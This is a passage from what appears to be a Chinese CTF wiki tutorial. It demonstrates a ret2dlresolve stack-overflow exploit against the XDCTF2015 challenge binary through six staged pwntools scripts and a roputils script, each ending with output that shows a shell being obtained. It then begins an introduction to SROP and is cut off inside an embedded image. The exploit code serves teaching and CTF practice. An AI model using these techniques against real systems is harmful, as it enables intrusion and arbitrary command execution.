     \-  stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。

2. 利用roputils中已经集成好的工具来实现攻击，从而获取shell。

**正常攻击**

显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。

```assembly
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main
Welcome to XDCTF2015~!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]──────────────────────────────────────────────────────────
$eax   : 0x000000c9
$ebx   : 0x00000000
$ecx   : 0xffffcc6c  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x00000100
$esp   : 0xffffcce0  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xffffcd50  →  0xffffcd70  →  0x00000001
$eip   : 0x62616164 ("daab"?)
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────────────────
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────────────────
['0xffffcce0', 'l8']
8
0xffffcce0│+0x00: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"  ← $esp
0xffffcce4│+0x04: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffcce8│+0x08: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffccec│+0x0c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffccf0│+0x10: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffccf4│+0x14: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffccf8│+0x18: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffccfc│+0x1c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search
[!] Syntax
pattern search PATTERN [SIZE]
gef➤  pattern search 0x62616164
[+] Searching '0x62616164'
[+] Found at offset 112 (little-endian search) likely

```

**stage 1**

这里我们的主要目的是控制程序执行write函数，虽然我们可以控制程序直接执行write函数。但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到bss段来控制write函数。即主要分为两步

1. 将栈迁移到bss段。
2. 控制write函数输出相应字符串。

这里主要使用了pwntools中的ROP模块。具体代码如下

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
## stack privot to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())
## write cmd="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

结果如下

```assembly
➜  ret2dlresolve git:(master) ✗ python stage1.py
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main': pid 120912
[*] Loaded cached gadgets for './main'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

**stage 2**

在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
## stack privot to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())
## write cmd="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"
plt0 = elf.get_section_by_name('.plt').header.sh_addr
write_index = (elf.plt['write'] - plt0) / 16 - 1
write_index *= 8
rop.raw(plt0)
rop.raw(write_index)
## fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

效果如下，仍然输出了cmd对应的字符串。

```assembly
➜  ret2dlresolve git:(master) ✗ python stage2.py
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main': pid 123406
[*] Loaded cached gadgets for './main'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

**stage 3**

这一次，我们同样控制dl_resolve函数中的index_offset参数，不过这次控制其指向我们伪造的write重定位项。

鉴于pwntools本身并不支持对重定位表项的信息的获取。这里我们手动看一下

```assembly
➜  ret2dlresolve git:(master) ✗ readelf -r main  
重定位节 '.rel.dyn' 位于偏移量 0x318 含有 3 个条目：
 偏移量     信息    类型              符号值      符号名称
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0
0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0
重定位节 '.rel.plt' 位于偏移量 0x330 含有 5 个条目：
 偏移量     信息    类型              符号值      符号名称
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
```

可以看出write的重定表项的r_offset=0x0804a01c，r_info=0x00000607。具体代码如下

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
## stack privot to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())
## write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
## making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = 0x607
rop.raw(plt0)
rop.raw(index_offset)
## fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(write_got)  # fake reloc
rop.raw(r_info)
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

最后结果如下，这次我们在bss段伪造了一个假的write的重定位项，仍然输出了对应的字符串。

```assembly
➜  ret2dlresolve git:(master) ✗ python stage3.py
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main': pid 126063
[*] Loaded cached gadgets for './main'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

**stage 4**

stage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607>>8=0x6。因此，我们知道write对应的符号地址为0x8048238。

```assembly
➜  ret2dlresolve git:(master) ✗ objdump -s -EL -j  .dynsym main
main：     文件格式 elf32-i386
Contents of section .dynsym:
 80481d8 00000000 00000000 00000000 00000000  ................
 80481e8 33000000 00000000 00000000 12000000  3...............
 80481f8 27000000 00000000 00000000 12000000  '...............
 8048208 52000000 00000000 00000000 20000000  R........... ...
 8048218 20000000 00000000 00000000 12000000   ...............
 8048228 3a000000 00000000 00000000 12000000  :...............
 8048238 4c000000 00000000 00000000 12000000  L...............
 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........
 8048258 0b000000 3c860408 04000000 11001000  ....<...........
 8048268 1a000000 40a00408 04000000 11001a00  ....@...........
```

这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为16个字节。

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
## stack privot to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())
## write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
### making fake write symbol
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (
    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])
### making fake write relocation
## making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got, r_info])
rop.raw(plt0)
rop.raw(index_offset)
## fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

具体效果如下

```assembly
➜  ret2dlresolve git:(master) ✗ python stage4.py
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main': pid 128795
[*] Loaded cached gadgets for './main'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

**stage 5**

这一阶段，我们将在阶段4的基础上，我们进一步使得write符号的st_name指向我们自己构造的字符串。

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
## stack privot to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())
## write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
### making fake write symbol
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (
    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
## plus 10 since the size of Elf32_Sym is 16.
st_name = fake_sym_addr + 0x10 - dynstr
fake_write_sym = flat([st_name, 0, 0, 0x12])
### making fake write relocation
## making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got, r_info])
rop.raw(plt0)
rop.raw(index_offset)
## fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('write\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

效果如下

```assembly
➜  ret2dlresolve git:(master) ✗ python stage5.py      
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main': pid 129249
[*] Loaded cached gadgets for './main'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

**stage 6**

这一阶段，我们只需要将原先的write字符串修改为system字符串，同时修改write的参数为system的参数即可获取shell。这是因为，dl_resolve最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')
offset = 112
bss_addr = elf.bss()
r.recvuntil('Welcome to XDCTF2015~!\n')
## stack privot to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())
## write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
### making fake write symbol
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (
    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
## plus 10 since the size of Elf32_Sym is 16.
st_name = fake_sym_addr + 0x10 - dynstr
fake_write_sym = flat([st_name, 0, 0, 0x12])
### making fake write relocation
## making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got, r_info])
rop.raw(plt0)
rop.raw(index_offset)
## fake ret addr of write
rop.raw('bbbb')
rop.raw(base_stage + 82)
rop.raw('bbbb')
rop.raw('bbbb')
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('system\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
print rop.dump()
print len(rop.chain())
rop.raw(sh + '\x00')
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

需要注意的是，这里我'/bin/sh'的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。

0x0050:      'aara'

效果如下

```python
➜  ret2dlresolve git:(master) ✗ python stage6.py
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main': pid 130415
[*] Loaded cached gadgets for './main'
0x0000:        0x8048380
0x0004:           0x2528
0x0008:           'bbbb' 'bbbb'
0x000c:        0x804a892
0x0010:           'bbbb' 'bbbb'
0x0014:           'bbbb' 'bbbb'
0x0018: '\x1c\xa0\x04\x08' '\x1c\xa0\x04\x08\x07i\x02\x00'
0x001c:  '\x07i\x02\x00'
0x0020:           'aaaa' 'aaaaaaaa'
0x0024:           'aaaa'
0x0028:  '\x00&\x00\x00' '\x00&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
0x002c: '\x00\x00\x00\x00'
0x0030: '\x00\x00\x00\x00'
0x0034: '\x12\x00\x00\x00'
0x0038:           'syst' 'system\x00'
0x003c:        'em\x00o'
0x0040:             'aa'
0x0044:           'aaaa' 'aaaaaaaaaaaaaa'
0x0048:           'aaaa'
0x004c:           'aaaa'
0x0050:           'aara'
82
[*] Switching to interactive mode
/bin/sh: 1: xa: not found
$ ls
core  main.c     stage2.py  stage4.py  stage6.py
main  stage1.py  stage3.py  stage5.py
```

**工具攻击**

根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下

```python
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('./main')
context.log_level = 'debug'
r.recv()
rop = ROP('./main')
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)
buf += rop.call('read', 0, bss_base, 100)
## used to call dl_Resolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)
buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
```

关于dl_resolve_call与dl_resolve_data的具体细节请参考roputils.py的源码，比较容易理解，需要注意的是，dl_resolve执行完之后也是需要有对应的返回地址的。

效果如下

```assembly
➜  ret2dlresolve git:(master) ✗ python roptool.py                       
[+] Starting local process './main': pid 6114
[DEBUG] Received 0x17 bytes:
    'Welcome to XDCTF2015~!\n'
[DEBUG] Sent 0x94 bytes:
    00000000  46 4c 68 78  52 36 67 6e  65 47 53 58  71 77 51 49  │FLhx│R6gn│eGSX│qwQI│
    00000010  32 43 6c 49  77 76 51 33  47 49 4a 59  50 74 6c 38  │2ClI│wvQ3│GIJY│Ptl8│
    00000020  57 54 68 4a  63 48 39 62  46 55 52 58  50 73 38 64  │WThJ│cH9b│FURX│Ps8d│
    00000030  72 4c 38 63  50 79 37 73  55 45 7a 32  6f 59 5a 42  │rL8c│Py7s│UEz2│oYZB│
    00000040  76 59 32 43  74 75 77 6f  70 56 61 44  6a 73 35 6b  │vY2C│tuwo│pVaD│js5k│
    00000050  41 77 78 77  49 72 7a 49  70 4d 31 67  52 6f 44 6f  │Awxw│IrzI│pM1g│RoDo│
    00000060  43 44 43 6e  45 31 50 48  53 73 64 30  6d 54 7a 5a  │CDCn│E1PH│Ssd0│mTzZ│
    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│
    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│
    00000090  40 a0 04 08                                         │@···││
    00000094
[DEBUG] Sent 0x64 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  73 52 46 66  57 43 59 52  │/bin│/sh·│sRFf│WCYR│
    00000010  66 4c 35 52  78 49 4c 53  54 a0 04 08  07 e9 01 00  │fL5R│xILS│T···│····│
    00000020  6e 6b 45 32  52 76 73 6c  00 1e 00 00  00 00 00 00  │nkE2│Rvsl│····│····│
    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 74  │····│····│syst│em·t│
    00000040  5a 4f 4e 6c  6c 73 4b 5a  76 53 48 6e  38 37 49 47  │ZONl│lsKZ│vSHn│87IG│
    00000050  69 49 52 6c  50 44 38 67  45 77 75 6c  72 47 6f 67  │iIRl│PD8g│Ewul│rGog│
    00000060  55 41 52 4f                                         │UARO││
    00000064
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x8d bytes:
    'core\t     main    roptool.py   roputils.pyc\tstage2.py  stage4.py  stage6.py\n'
    '__init__.py  main.c  roputils.py  stage1.py\tstage3.py  stage5.py\n'
core         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py
__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
```

**SROP**

SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究**Framing Signals — A Return to Portable Shellcode**发表在安全顶级会SP2014上，被评选为当年的Best Student Papers。

**signal机制**

signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示

![Process of Signal Handlering](data:image/png;base64,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